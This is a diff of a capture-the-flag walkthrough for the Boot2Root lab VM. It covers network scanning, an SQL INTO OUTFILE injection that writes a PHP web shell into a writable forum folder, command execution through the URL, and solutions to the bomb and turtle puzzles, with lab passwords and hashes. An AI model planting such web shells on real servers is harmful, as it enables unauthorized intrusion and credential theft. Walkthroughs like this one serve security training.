@@ -15,7 +15,7 @@ netdiscover -r 10.13.0.0/16     // to get ip address of virtual box env. (e.g. 1
 nmap 10.13.0.132                // to get open ports (notably 80 http and 443 https)  
 ```
 
-## LMEZARD user
+## Web Portal
 
 #### Get access to forum and get email
 
@@ -36,78 +36,89 @@ nmap 10.13.0.132                // to get open ports (notably 80 http and 443 ht
 SELECT "<?php $out = array();exec($_GET[\"cmd\"], $out);foreach($out as $line) {echo $line.\"<br />\";}?>" INTO outfile "/path/to/file/cmd.php"
 ```
 3. Now you need to find out where to put the file so you have access rights.  
-The server is apache, so you try `/var/www/` and get error insufficient rights.  
-You go back to the dirb results (`dirb https://10.13.0.132`) to check server folder hierarchy.  
-Try every sub folder (e.g. forum you try `/var/www/forum/cmd.php`) until you find you have rights to `/var/www/forum/templates_c folder`.  
-So now you have your php script in that folder, go to `https://10.13.0.132/forum/templates_c/cmd.php?cmd=ls%20-la%20/home`  
+    The server is apache, so you try `/var/www/` and get error insufficient rights.  
+    You go back to the dirb results (`dirb https://10.13.0.132`) to check server folder hierarchy.  
+    Try every sub folder (e.g. forum you try `/var/www/forum/cmd.php`) until you find you have rights to `/var/www/forum/templates_c folder`.  
+    So now you have your php script in that folder, go to `https://10.13.0.132/forum/templates_c/cmd.php?cmd=ls%20-la%20/home`  
 4. Using shell commands in the url query, find directory called LOOKATME, the file named password. Use cat on file and get credentials: lmezard:G!@M6f4Eatau{sF"  
 5. Login to Boot2Root VM.
 
-## LAURIE user
+## LMEZARD user
 
 1. Read instructions in directory and checkout fun with `file fun`  
 2. Copy fun in `/tmp/` and cd there. Then unarchive it with `tar xvf fun` to get directory ft_fun/  
 3. Run script in directory:
-`./notfun.sh`
-```
- #!/bin/sh
- for f in *.pcap; do
-  d="$(cat $f | grep file | cut -c 3-)"
- mv "$f" "$d"
- sed -i '$d' "$d"
- sed -i '/^$/d' "$d"
-done
+    `./notfun.sh`
+    ```
+    #!/bin/sh
+    for f in *.pcap; do
+      d="$(cat $f | grep file | cut -c 3-)"
+      mv "$f" "$d"
+      sed -i '$d' "$d"
+      sed -i '/^$/d' "$d"
+    done
 
-i=1
-while [ $i -lt 100 ]
-do
- if [ $i -lt 10 ]; then
-  mv "file$i" "file00$i"
- else
-  mv "file$i" "file0$i"
- fi
- i=$((i+1))
-done
-cat "file*" > main.c
-```
-4. Compile and execute the C file to get password.  
-```
-lmezard@BornToSecHackMe:ft_fun$ gcc main.c && ./a.out
-My password is: Iheartpwnage
-Encrypt it with Sha-256 to use passwordlmezard@BornToSecHackMe:ft_fun$
-```
+    i=1
+    while [ $i -lt 100 ]
+    do
+      if [ $i -lt 10 ]; then
+        mv "file$i" "file00$i"
+      else
+        mv "file$i" "file0$i"
+      fi
+      i=$((i+1))
+    done
+    cat "file*" > main.c
+    ```
+4. Compile and execute the C file to get password.
+    ```
+    lmezard@BornToSecHackMe:ft_fun$ gcc main.c && ./a.out
+    My password is: Iheartpwnage
+    Encrypt it with Sha-256 to use passwordlmezard@BornToSecHackMe:ft_fun$
+    ```
 5. Encrypting "Iheartpwnage" with Sha-256 gives you: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
 
-## THOR user
+## LAURIE user
 
 1. Bomb is an executable. Use [Ghidra](https://ghidra-sre.org/) to transform the binary into pseudo C code in order to inspect all 6 levels of the bomb.  
 2. The README file gives you hints for all the levels (usually first or second character of the answer).  
 3. The first level simply checks if your answer is equal to "Public speaking is very easy."  
 4. The second level requires an array of 6 integers which must not return true on the following while n increases from 1 to 5 inclusively:
-```
-answers[n+1] != (n + 1) * answers[n]
-```
-Which gives you "1 2 6 24 120 720"  
+    ```
+    answers[n+1] != (n + 1) * answers[n]
+    ```
+    Which gives you "1 2 6 24 120 720"  
 5. The third level has multiple possible answers, but knowing that the second character has to be "b" (thanks to the hint), you get "2 b 214"
 6. The fourth level checks that the following function returns 55:
-```
-phase_4.swift
-func calc(num: Int) -> Int {
-    var a = 0, b = 0
+    ```
+    phase_4.swift
+    func calc(num: Int) -> Int {
+        var a = 0, b = 0
     
-    if num < 2 {
-        b = 1
-    } else {
-        a = calc(num: num - 1)
-        b = calc(num: num - 2)
-        b = b + a
+        if num < 2 {
+            b = 1
+        } else {
+            a = calc(num: num - 1)
+            b = calc(num: num - 2)
+            b = b + a
+        }
+        return b
     }
-    return b
-}
-```
-So the answer is 9.  
-7. The fifth level 
+    ```
+    So the answer is 9.  
+7. The fifth level you find that you need to input 5 characters which, after being AND 0xf and used as index in the array in the screenshot, give the word "giants". (e.g. "g" from "giants" is position 15 in the array, which you can get after xxxx1111 &AND 0xf. The only letter with xxxx0000 is "o")  
+    ![bomb_phase_5](https://github.com/42aroger/boot2root/blob/master/img/bomb_phase_5.png?raw=true)  
+    Following this logic, the outcome is opekmq.  
+8. The last level (6) has a pretty hefty function with a bunch of operations, but reading the first few, you can deduce that you need 6 non-repeating numbers (never the same number twice), between 1 and 6. With the hint, you also know that the second number is "2". So after that you can feed all the possible sequences to the function until one passes the tests. The winner is "4 2 6 3 1 5".
+9. Following the instructions, you must concatenate all the answers without spaces to form the password. But do not forget to [swap len-1 and len-2 character](https://stackoverflow.com/c/42network/questions/664).  
+10. The password for Thor is then: "Publicspeakingisveryeasy.126241207201b2149opekmq426135"
 
+## THOR user
+
+1. The file turtle contains human inscructions to move around (probably to draw something). Turtle is a python library which uses human-like function names to draw in 2D space. Parsing this into the actual Turtle code will draw something on screen.  
+2. Use the `turtle_parser.py` script in the same directory which will draw "SLASH".  
+3. At the bottom of the turtle file, it is written "Can you digest the message? :)". Digest Message -> Message Digest -> Message Digest 5 -> MD5.
+4. "SLASH" hashed with MD5 gives you: `646da671ca01bb5d84dbb5fb2238dc8e` which is the password for ZAZ.
 
 ## ZAZ user
 
